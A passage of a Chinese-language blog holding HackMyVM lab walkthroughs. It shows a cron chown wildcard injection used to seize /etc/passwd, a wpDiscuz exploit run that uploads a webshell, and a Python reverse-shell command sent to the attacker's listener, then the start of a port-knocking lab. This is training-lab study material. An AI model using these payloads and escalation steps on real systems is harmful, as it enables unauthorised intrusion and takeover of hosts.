class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">29</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">28</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">27</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">26</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">25</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">24</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">23</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">22</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">21</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">20</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">19</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">18</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">17</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">16</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">15</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">14</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">12</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">11</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">10</span>     |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">9</span>      |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">8</span>      |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">6</span>      |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">4</span>      |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">3</span>      |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2</span>      |</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">42</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">1</span>      | /sbin/init</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">18</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2795</span>   | /usr/sbin/CRON <span class="operator">-f</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">18</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2796</span>   | /usr/sbin/CRON <span class="operator">-f</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">18</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2797</span>   | /bin/sh <span class="literal">-c</span> <span class="built_in">cd</span> /opt &amp;&amp; chown root:root *</span><br></pre></td></tr></table></figure>

<p>发现后台每次都有一次chown root</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">touch reference</span><br><span class="line">touch <span class="literal">--</span> <span class="literal">--reference</span>=reference</span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">27</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2832</span>   | /usr/sbin/CRON <span class="operator">-f</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">27</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2833</span>   | /usr/sbin/CRON <span class="operator">-f</span></span><br><span class="line"><span class="number">2023</span>/<span class="number">07</span>/<span class="number">24</span> <span class="number">08</span>:<span class="number">27</span>:<span class="number">01</span> CMD: UID=<span class="number">0</span>     PID=<span class="number">2834</span>   | /bin/sh <span class="literal">-c</span> <span class="built_in">cd</span> /opt &amp;&amp; chown root:root *</span><br><span class="line">ln <span class="literal">-s</span> /etc/passwd</span><br></pre></td></tr></table></figure>

<p>简单解释下：</p>
<p>​	因为chown root:root后面这个*，让后台程序运行起来变成 chown root:root –reference&#x3D;reference id_rsa passwd，此时–reference文件变成了参数。</p>
<p>等待1分钟然后查看&#x2F;etc&#x2F;passwd文件权限（把pspy64关了）</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">touch reference</span><br><span class="line">touch <span class="literal">--</span> <span class="literal">--reference</span>=reference</span><br><span class="line">ln <span class="literal">-s</span> /etc/passwd</span><br><span class="line"><span class="built_in">ls</span> <span class="literal">-al</span></span><br><span class="line">total <span class="number">12</span></span><br><span class="line"><span class="literal">-rw-r--r--</span>  <span class="number">1</span> beloved beloved    <span class="number">0</span> Jul <span class="number">24</span> <span class="number">08</span>:<span class="number">37</span> <span class="literal">--reference</span>=reference</span><br><span class="line">drwxrwx<span class="literal">---</span>  <span class="number">2</span> root    beloved <span class="number">4096</span> Jul <span class="number">24</span> <span class="number">08</span>:<span class="number">37</span> .</span><br><span class="line">drwxr<span class="literal">-xr-x</span> <span class="number">18</span> root    root    <span class="number">4096</span> May <span class="number">19</span>  <span class="number">2021</span> ..</span><br><span class="line"><span class="literal">-rw-------</span>  <span class="number">1</span> root    root    <span class="number">1823</span> Jun <span class="number">27</span>  <span class="number">2021</span> id_rsa</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> beloved beloved   <span class="number">11</span> Jul <span class="number">24</span> <span class="number">08</span>:<span class="number">37</span> passwd -&gt; /etc/passwd</span><br><span class="line"><span class="literal">-rw-r--r--</span>  <span class="number">1</span> root    root       <span class="number">0</span> Jul <span class="number">24</span> <span class="number">08</span>:<span class="number">36</span> reference</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 123123 #生成md5</span><br><span class="line">vi /etc/passwd #写入</span><br></pre></td></tr></table></figure>



<h2 id="方法2："><a href="#方法2：" class="headerlink" title="方法2："></a>方法2：</h2><p>1.搜索漏洞：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># searchsploit wpDiscuz</span></span><br><span class="line"><span class="literal">----------------------------------------------------------------------------------------------------------------</span> <span class="literal">---------------------------------</span></span><br><span class="line"> Exploit Title                                                                                                  |  Path</span><br><span class="line"><span class="literal">----------------------------------------------------------------------------------------------------------------</span> <span class="literal">---------------------------------</span></span><br><span class="line">Wordpress Plugin wpDiscuz <span class="number">7.0</span>.<span class="number">4</span> - Arbitrary File Upload (Unauthenticated)                                       | php/webapps/<span class="number">49962</span>.sh</span><br><span class="line">WordPress Plugin wpDiscuz <span class="number">7.0</span>.<span class="number">4</span> - Remote Code Execution (Unauthenticated)                                       | php/webapps/<span class="number">49967</span>.py</span><br><span class="line">Wordpress Plugin wpDiscuz <span class="number">7.0</span>.<span class="number">4</span> - Unauthenticated Arbitrary File Upload (Metasploit)                            | php/webapps/<span class="number">49401</span>.rb</span><br><span class="line"><span class="literal">----------------------------------------------------------------------------------------------------------------</span> <span class="literal">---------------------------------</span></span><br><span class="line">Shellcodes: No Results</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2.攻击一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/usr/…/exploitdb/exploits/php/webapps]</span><br><span class="line">└─# searchsploit -m 49967</span><br><span class="line">python3 49967.py -u http://192.168.56.129 -p /2021/06/09/hello-world</span><br><span class="line">  Exploit: WordPress Plugin wpDiscuz 7.0.4 - Remote Code Execution (Unauthenticated)</span><br><span class="line">      URL: https://www.exploit-db.com/exploits/49967</span><br><span class="line">     Path: /usr/share/exploitdb/exploits/php/webapps/49967.py</span><br><span class="line">    Codes: CVE-2020-24186</span><br><span class="line"> Verified: False</span><br><span class="line">File Type: Python script, Unicode text, UTF-8 text executable, with very long lines (864)</span><br><span class="line">cp: &#x27;/usr/share/exploitdb/exploits/php/webapps/49967.py&#x27; and &#x27;/usr/share/exploitdb/exploits/php/webapps/49967.py&#x27; are the same file</span><br><span class="line">Copied to: /usr/share/exploitdb/exploits/php/webapps/49967.py</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---------------------------------------------------------------</span><br><span class="line">[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution</span><br><span class="line">[-] File Upload Bypass Vulnerability - PHP Webshell Upload</span><br><span class="line">[-] CVE: CVE-2020-24186</span><br><span class="line">[-] https://github.com/hevox</span><br><span class="line">---------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">[+] Response length:[51725] | code:[200]</span><br><span class="line">[!] Got wmuSecurity value: b7783836e9</span><br><span class="line">[!] Got wmuSecurity value: 1</span><br><span class="line"></span><br><span class="line">[+] Generating random name for Webshell...</span><br><span class="line">[!] Generated webshell name: tqguliyjfehjyqq</span><br><span class="line"></span><br><span class="line">[!] Trying to Upload Webshell..</span><br><span class="line">[+] Upload Success... Webshell path:url&amp;quot;:&amp;quot;http://beloved/wp-content/uploads/2023/07/tqguliyjfehjyqq-1690181429.2712.php&amp;quot;</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>

<p>发现注入漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://beloved/wp-content/uploads/2023/07/tqguliyjfehjyqq-1690181429.2712.php?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.56.127%22,8888));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27</span><br></pre></td></tr></table></figure>

<p>反弹攻击，开启端口监听</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nc -lvnp 8888</span></span><br><span class="line">listening on [<span class="type">any</span>] <span class="number">8888</span> ...</span><br><span class="line">connect to <span class="function">[<span class="number">192.168</span><span class="type">.56.127</span>] <span class="title">from</span></span> (UNKNOWN) [<span class="number">192.168</span><span class="type">.56.129</span>] <span class="number">45814</span></span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal <span class="keyword">process</span> <span class="built_in">group</span> (<span class="number">455</span>): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">www<span class="literal">-data</span>@beloved:/var/www/html/wordpress/wp<span class="literal">-content</span>/uploads/<span class="number">2023</span>/<span class="number">07</span><span class="variable">$</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其余步骤一致</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/24/beloved/" data-id="clmnr8k040005so8g42az3lq6" data-title="beloved" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/chown/" rel="tag">chown</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hackmyvm/" rel="tag">hackmyvm</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/msfs/" rel="tag">msfs</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-alzheimer" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/23/alzheimer/" class="article-date">
  <time class="dt-published" datetime="2023-07-23T13:27:23.000Z" itemprop="datePublished">2023-07-23</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/">渗透学习</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2023/07/23/alzheimer/">alzheimer</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <span id="more"></span>

<p>1.扫描网段</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -sP 192.168.56.0/24</span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-07-23</span> <span class="number">16</span>:<span class="number">51</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.1</span></span><br><span class="line">Host is up (<span class="number">0.00033</span>s latency).</span><br><span class="line">MAC Address: <span class="number">0</span>A:<span class="number">00</span>:<span class="number">27</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">0</span>A (Unknown)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.100</span></span><br><span class="line">Host is up (<span class="number">0.00019</span>s latency).</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:F1:<span class="number">8</span>F:<span class="number">2</span>D (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.128</span></span><br><span class="line">Host is up (<span class="number">0.0021</span>s latency).</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">79</span>:<span class="number">7</span>F:<span class="number">2</span>F (Oracle VirtualBox virtual NIC)</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: <span class="number">256</span> IP addresses (<span class="number">4</span> hosts up) scanned <span class="keyword">in</span> <span class="number">2.01</span> seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>2.扫描端口</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -sC -sV -p- 192.168.56.128 </span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-07-23</span> <span class="number">16</span>:<span class="number">51</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.128</span></span><br><span class="line">Host is up (<span class="number">0.0013</span>s latency).</span><br><span class="line">Not shown: <span class="number">65532</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE    SERVICE VERSION</span><br><span class="line"><span class="number">21</span>/tcp open     ftp     vsftpd <span class="number">3.0</span>.<span class="number">3</span></span><br><span class="line">|_ftp<span class="literal">-anon</span>: Anonymous FTP login allowed (FTP code <span class="number">230</span>)</span><br><span class="line">| ftp<span class="literal">-syst</span>: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:<span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      <span class="built_in">TYPE</span>: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout <span class="keyword">in</span> seconds is <span class="number">300</span></span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      <span class="keyword">Data</span> connections will be plain text</span><br><span class="line">|      At session startup, client count was <span class="number">3</span></span><br><span class="line">|      vsFTPd <span class="number">3.0</span>.<span class="number">3</span> - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line"><span class="number">22</span>/tcp filtered ssh</span><br><span class="line"><span class="number">80</span>/tcp filtered http</span><br><span class="line">MAC Address: <span class="number">08</span>:<span class="number">00</span>:<span class="number">27</span>:<span class="number">79</span>:<span class="number">7</span>F:<span class="number">2</span>F (Oracle VirtualBox virtual NIC)</span><br><span class="line">Service Info: OS: Unix</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">6.70</span> seconds</span><br></pre></td></tr></table></figure>

<p>3.由上述结果可知，ftp连接使用anonymous空密码登录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/ace]</span><br><span class="line">└─# ftp 192.168.56.128</span><br><span class="line">Connected to 192.168.56.128.</span><br><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">Name (192.168.56.128:ace): Anonymous    </span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password: </span><br><span class="line">230 Login successful.</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line">ftp&gt; ls -al</span><br><span class="line">229 Entering Extended Passive Mode (|||31145|)</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">drwxr-xr-x    2 0        113          4096 Oct 03  2020 .</span><br><span class="line">drwxr-xr-x    2 0        113          4096 Oct 03  2020 ..</span><br><span class="line">-rw-r--r--    1 0        0              70 Oct 03  2020 .secretnote.txt</span><br><span class="line">226 Directory send OK.</span><br><span class="line">ftp&gt; get .secretnote.txt</span><br><span class="line">local: .secretnote.txt remote: .secretnote.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||22343|)</span><br><span class="line">150 Opening BINARY mode data connection for .secretnote.txt (70 bytes).</span><br><span class="line">100% |*****************************************************************************************************|    70       33.75 KiB/s    00:00 ETA</span><br><span class="line">226 Transfer complete.</span><br><span class="line">70 bytes received in 00:00 (18.70 KiB/s)</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure>

<p>4.查看文件</p>
<p><img src="F:%5CDESKTOP%5C%E6%B8%97%E9%80%8F%5Cimage%5Cimage-20230723175853705.png" alt="image-20230723175853705"></p>
<p>说明要使用knockd工具打开端口</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># knock 192.168.56.128 1000:tcp 2000:tcp 3000:tcp -v</span></span><br><span class="line">hitting tcp <span class="number">192.168</span>.<span class="number">56.128</span>:<span class="number">1000</span></span><br><span class="line">hitting tcp <span class="number">192.168</span>.<span class="number">56.128</span>:<span class="number">2000</span></span><br><span class="line">hitting tcp <span class="number">192.168</span>.<span class="number">56.128</span>:<span class="number">3000</span></span><br></pre></td></tr></table></figure>

<p>再度扫描端口：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/<span class="type">home</span>/<span class="type">ace</span>]</span><br><span class="line">└─<span class="comment"># nmap -sC -sV -p- 192.168.56.128                   </span></span><br><span class="line">Starting Nmap <span class="number">7.93</span> ( https://nmap.org ) at <span class="number">2023</span><span class="literal">-07-23</span> <span class="number">17</span>:<span class="number">35</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> <span class="number">192.168</span>.<span class="number">56.128</span></span><br><span class="line">Host is up (<span class="number">0.0015</span>s latency).</span><br><span class="line">Not shown: <span class="number">65532</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">21</span>/tcp open  ftp     vsftpd <span class="number">3.0</span>.<span class="number">3</span></span><br><span class="line">|_ftp<span class="literal">-anon</span>: Anonymous FTP login allowed (FTP code <span class="number">230</span>)</span><br><span class="line">| ftp<span class="literal">-syst</span>: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:<span class="number">192.168</span>.<span class="number">56.127</span></span><br><span class="line">|      Logged <span class="keyword">in</span> as ftp</span><br><span class="line">|      <span class="built_in">TYPE</span>: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout <span class="keyword">in</span> seconds is <span class="number">300</span></span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      <span class="keyword">Data</span> connections will be plain text</span><br><span class="line">|      At session startup, client count was <span class="number">4</span></span><br><span class="line">|      vsFTPd <span class="number">3.0</span>.<span class="number">3</span> - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line"><span class="number">22</span>/tcp open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span>+deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| ssh<span class="literal">-hostkey</span>: </span><br><span class="line">|   <span class="number">2048</span> b13b2b36e56bd72a6defbfda0a5d2d43 (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">35</span>f170aba366f1d6d72cf7d1247a5f2b (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> be15fab681d67fabc81c97a5ea11854e (ED25519)</span><br><span class="line"><span class="number">80</span>/tcp open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">|_http<span class="literal">-title</span>: Site doesn<span class="string">&#x27;t have a title (text/html).</span></span><br><span class="line"><span class="string">|_http-server-header: nginx/1.14.2</span></span><br><span class="line"><span class="string">MAC Address: 08:00:27:79:7F:2F (Oracle VirtualBox virtual NIC)</span></span><br><span class="line"><span class="string">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 11.62 seconds</span></span><br><span class="line"><span class="string">                                                                     </span></span><br></pre></td></tr></table></figure>

<p>80端口开放了 ，即网页可进行访问了</p>
